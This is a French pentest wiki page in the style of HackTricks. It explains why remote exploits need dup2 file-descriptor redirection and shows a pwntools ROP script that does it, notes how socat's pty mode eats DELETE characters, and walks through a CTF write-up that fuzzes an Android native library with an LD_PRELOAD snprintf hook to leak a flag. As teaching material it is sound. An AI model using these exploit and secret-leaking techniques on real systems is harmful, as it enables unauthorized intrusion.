# Problèmes courants d'Exploiting

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

Lors de l'envoi d'un exploit à un serveur distant qui appelle par exemple **`system('/bin/sh')`**, cela sera exécuté dans le processus serveur, bien sûr, et `/bin/sh` attendra des entrées depuis stdin (FD: `0`) et affichera la sortie sur stdout et stderr (FDs `1` et `2`). Ainsi, l'attaquant ne pourra pas interagir avec le shell.

Une façon de corriger cela est de supposer qu'au démarrage le serveur a créé le **numéro de FD `3`** (pour l'écoute) et que votre connexion se trouvera alors dans le **numéro de FD `4`**. Par conséquent, il est possible d'utiliser l'appel système **`dup2`** pour dupliquer stdin (FD `0`) et stdout (FD `1`) sur le FD `4` (celui de la connexion de l'attaquant), ce qui permettra de contacter le shell une fois qu'il sera exécuté.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Notez que socat transfère déjà **`stdin`** et **`stdout`** vers le socket. Cependant, le mode `pty` **inclut des caractères DELETE**. Ainsi, si vous envoyez un `\x7f` (`DELETE`), il va **supprimer le caractère précédent** de votre exploit.

Pour contourner cela, le **caractère d'échappement `\x16` doit être préfixé à tout `\x7f` envoyé.**

**Vous pouvez** [**trouver un exemple de ce comportement**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Lorsqu'une application Android est fournie uniquement avec un `.so` AArch64 stripped, vous pouvez quand même fuzz la logique exportée directement sur l'appareil sans reconstruire l'APK. Un workflow pratique :

1. **Localiser les points d'entrée appelables.** `objdump -T libvalidate.so | grep -E "validate"` liste rapidement les fonctions exportées. Les décompilateurs (Ghidra, IDA, BN) révèlent la signature réelle, p.ex. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Écrire un harness autonome.** Charger un fichier, conserver le buffer en mémoire, et appeler le symbole exporté exactement comme l'app le ferait. Cross-compile avec le NDK (e.g. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Exemple minimal de harness piloté par fichier</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Reconstruire la structure attendue.** Les chaînes d'erreur et les comparaisons dans Ghidra montraient que la fonction analysait du JSON strict avec des clés constantes (`magic`, `version`, des `root.children.*` imbriqués) et des vérifications arithmétiques (par ex., `value * 2 == 84` ⇒ `value` doit être `42`). Fournir du JSON syntaxiquement valide qui satisfait progressivement chaque branche permet de reconstituer le schéma sans instrumentation.
4. **Contourner l'anti-debug pour leak des secrets.** Parce que le `.so` importe `snprintf`, remplacez-le via `LD_PRELOAD` pour dump des format strings sensibles même lorsque les breakpoints sont bloqués :

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates le internal flag et confirme le crash oracle sans patcher le binary.
5. **Réduire l'espace de fuzz.** Le désassemblage a révélé une clé XOR réutilisée dans la comparaison du flag, ce qui signifie que les sept premiers octets du `flag` étaient connus. Ne fuzz que les neuf octets inconnus.
6. **Intégrer les octets de fuzz dans une enveloppe JSON valide.** Le harness AFL lit exactement neuf octets depuis `stdin`, les copie dans le suffixe du flag, et code en dur tous les autres champs (constantes, profondeurs d'arbre, arithmetic preimage). Toute lecture malformée entraîne simplement une sortie, donc AFL dépense des cycles sur des cas de test significatifs.

<details>
<summary>Harness compatible avec AFL pour JSON structuré</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Tout input qui satisfait toutes les vérifications sémantiques et devine le bon suffixe de neuf octets déclenche le crash délibéré ; ces fichiers se retrouvent dans `output/crashes` et peuvent être rejoués via le simple harness pour récupérer le secret.

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

### Pages associées

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Références

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)

{{#include ../banners/hacktricks-training.md}}
